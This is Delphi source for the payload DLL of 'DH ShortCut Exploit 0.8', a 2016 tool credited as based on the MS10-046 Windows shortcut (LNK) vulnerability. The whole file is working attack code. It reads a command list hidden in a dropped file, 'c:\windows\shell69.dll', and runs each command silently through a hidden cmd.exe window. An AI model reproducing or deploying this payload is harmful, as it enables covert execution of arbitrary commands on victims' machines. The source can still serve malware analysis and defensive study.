// DH ShortCut Exploit 0.8
// (C) Doddy Hackman 2016
// Credits :
// Based on : http://www.delphibasics.info/home/delphibasicscounterstrikewireleases/ms10-046cpllnkexploit-lnkvulnerabilitybyparayvx
// Thanks to Paray_Vx

library payload;

uses
  System.SysUtils,
  System.Classes, DH_Tools, DH_Builder_Tools, Windows, ShellApi;

{$R *.res}
// Functions

function execute_command(command: string): string;
// Credits : Function ejecutar() based in : http://www.delphidabbler.com/tips/61
// Thanks to www.delphidabbler.com

var
  SecurityAttributes: TSecurityAttributes;
  StartupInfo: TStartupInfo;
  ProcessInformation: TProcessInformation;
  Handle1: THandle;
  Handle2: THandle;
  check: Boolean;
  output: array [0 .. 255] of AnsiChar;
  check2: Cardinal;
  check3: Boolean;
  code: string;

begin
  if not(command = '') then
  begin
    try
      begin
        code := '';

        with SecurityAttributes do
        begin
          nLength := SizeOf(SecurityAttributes);
          bInheritHandle := True;
          lpSecurityDescriptor := nil;
        end;

        CreatePipe(Handle1, Handle2, @SecurityAttributes, 0);

        with StartupInfo do
        begin
          FillChar(StartupInfo, SizeOf(StartupInfo), 0);
          cb := SizeOf(StartupInfo);
          dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
          wShowWindow := SW_HIDE;
          hStdInput := GetStdHandle(STD_INPUT_HANDLE);
          hStdOutput := Handle2;
          hStdError := Handle2;
        end;

        check3 := CreateProcess(nil, Pchar('cmd.exe /C ' + command), nil, nil,
          True, 0, nil, Pchar('c:/'), StartupInfo, ProcessInformation);

        CloseHandle(Handle2);

        if check3 then

          repeat

          begin
            check := ReadFile(Handle1, output, 255, check2, nil);
          end;

          if check2 > 0 then
          begin
            output[check2] := #0;
            code := code + output;
          end;

          until not(check) or (check2 = 0);

        Result := code;
      end;
    except
      begin
        Result := '[-] Console : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] Console : ERROR';
  end;
end;

function regex(text: String; deaca: String; hastaaca: String): String;
begin
  Delete(text, 1, AnsiPos(deaca, text) + length(deaca) - 1);
  SetLength(text, AnsiPos(hastaaca, text) - 1);
  Result := text;
end;

//

var
  code: string;
  builder: T_DH_Builder_Tools;
  tools: T_DH_Tools;
  separador: string;
  commands: string;

var
  list_commands: TStringList;
  command: string;
  i: integer;

begin
  separador := '0x2D64685F736570617261646F722D';
  tools := T_DH_Tools.Create();
  builder := T_DH_Builder_Tools.Create();
  code := builder.read_eof('c:\windows\shell69.dll', separador, separador, 123);
  if (code = '') then
  begin
    MessageBoxA(0, 'ERROR', 'ERROR', MB_ICONWARNING);
  end
  else
  begin
    commands := regex(code, '[commands]', '[commands]');
    if not(commands = '') then
    begin
      list_commands := TStringList.Create();
      list_commands.Clear;
      list_commands.Delimiter := ',';
      list_commands.StrictDelimiter := True;
      list_commands.DelimitedText := commands;

      for i := 0 to list_commands.Count - 1 do
      begin
        command := list_commands[i];
        if not(command = '') then
        begin
          execute_command(command);
        end;
      end;
      list_commands.Free();
    end;
  end;

  builder.Free();
  tools.Free();

  ExitProcess(0);

end.

// The End ?
